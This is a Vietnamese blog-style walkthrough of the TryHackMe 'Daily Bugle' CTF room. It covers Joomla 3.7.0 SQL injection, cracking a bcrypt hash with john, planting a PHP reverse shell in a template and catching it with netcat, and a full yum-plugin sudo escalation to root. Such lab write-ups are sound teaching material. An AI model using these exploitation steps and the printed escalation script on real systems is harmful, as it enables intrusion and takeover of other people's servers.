---
title: "Tryhackme - Daily Bugle"
date: "2021-10-24"
tags: [
    "web",
    "linux",
    "ssh",
    "wget"
]
---

Hôm nay tôi sẽ giải CTF [Tryhackme - Daily Bugle](https://tryhackme.com/room/dailybugle). Géc gô!!!

## Reconnaissance

Vẫn như thông thường thôi, việc đầu tiên cần làm là quét cổng. 

```python
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   syn-ack MariaDB (unauthorized)
```
Với port 80 tôi thấy có path */joomla/*, vậy là web này được buil trên Joomla CMS, và nếu qua path /administrator/ thì tôi sẽ vào được login page joomla. Tuy nhiên với kiến thức hạn hẹp, phải loay hoay 1 lúc lâu tôi mới tìm ra được version joomla đang chạy trên machine này. 

Lội qua 1 đống tool thì tôi tìm được thằng này: [juumla](https://github.com/oppsec/juumla.git) giúp check version cũng như tìm find backup hay config, khá tiện. 
```python
┌──(neo㉿kali)-[~/juumla]
└─$ python main.py -u http://10.10.91.181
jUuMlA - 0.1.4
most overrated joomla scanner
> Checking if target is running Joomla... 
> Running Joomla version scanner... [1/3] 
> Joomla version is: 3.7.0 
> Running Joomla vulnerabilities scanner... [2/3] 
> Joomla! 3.7 - SQL Injection 
> Vulnerabilities scanner finished [2/3] 
```
Check trên [exploit-db](https://www.exploit-db.com/exploits/42033) Tôi có 1 SQLi, chạy thử [sqlmap](https://github.com/sqlmapproject/sqlmap) nhưng nó quá lâu (lâu vô hạnnnn =.=). Vậy nên tôi thử tìm trên github xem có payload joomla version 3.7.0 không. Và nó ở [đây](https://github.com/stefanlucas/Exploit-Joomla.git). 

Clone nó về và chạy với IP machine và tôi có luôn user trong 1 phút, phí mất 15 phút ngồi chờ thằng sqlmap, ngẫn quá :sweat:  
```python
[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```
Ném thằng hash này vào 1 file vào dùng john để decrypt nó.
```python
┌──(neo㉿kali)-[~]
└─$ sudo john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:43 13.62% (ETA: 04:25:48) 0g/s 78.57p/s 78.57c/s 78.57C/s piccolo..yahweh
spiderman123     (?) 
```
## Upload reverse shell
Login vào joomla để upload shell. Dạo quanh 1 lúc thì tôi thấy template là nơi có thể upload shell vì nó sẽ là thứ hiện ra cho người dùng khi họ truy cập vào trang web. 

Sửa file php có sẵn trong template thành reverse shell php, shell này tôi lấy từ [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell), sửa listen host và port thành ip machine của mình.

![upload-shell](2.png)

Tạo listener bằng netcat: `nc -lnvp 2402` sau đó truy cập vào file vừa sửa: `http://IP-MACHINE/templates/beez3/index.php`

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 2402
listening on [any] 2402 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.71.145] 37496
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 23:38:06 up 36 min,  0 users,  load average: 0.03, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
```
Config lại shell bằng python nhưng không được, trong thư mục __/home__ tôi có thư mục jjameson nhưng không thể truy cập. Tôi sẽ tìm xung quanh xem có password của ông này không. Tôi sẽ ưu tiên các file config vì thường thì các user và passwd sẽ được lưu ở đây. Thêm nữa đây là web được buil trên php nên tôi sẽ thử tìm file `config.php` xem có thu được gì đặc biệt không.

Sau khi lần mò trong thư mục lưu trữ web (thường là `/var/www/html/`) tôi tìm thấy 2 file `configuration.php` và `web.config.php`

![jjameson](3.png)

```python
su jjameson
Password: nv5uz9r3ZEDzVjNu
id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
```
Vào thư mục jjameson và tôi có user flag
```python
[jjameson@dailybugle ~]$ ls
user.txt
```
## Privilege escalation
Lệnh `sudo -l` để kiểm tra xem user jjameson có chạy command nào với quyền root không
```python
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
Tôi lại lượn qua [GTFOBins](https://gtfobins.github.io/gtfobins/yum/) xem cách lên root bằng yum. Do tôi không thấy fpm ở phần a xuất hiện trong machine nên tôi sẽ thử dùng cách b.
```python
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
```python
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# ls /root/root.txt
/root/root.txt
```
## Tổng kết
Qua bài này chúng ta biết thêm về ***Joomla cms***, biết đâu sau này lại có hứng thú tạo web bằng thằng này. Tiếp theo là cách sử dụng ***exploit-db*** để tìm kiếm lỗ hổng trong các phiên bản của ứng dụng, cách sử dụng ***john-the-ripper*** để decrypt file hash. Cuối cùng là cách sử dụng yum để leo thang đặc quyền. Yeah chắc vậy là đủ rồi.




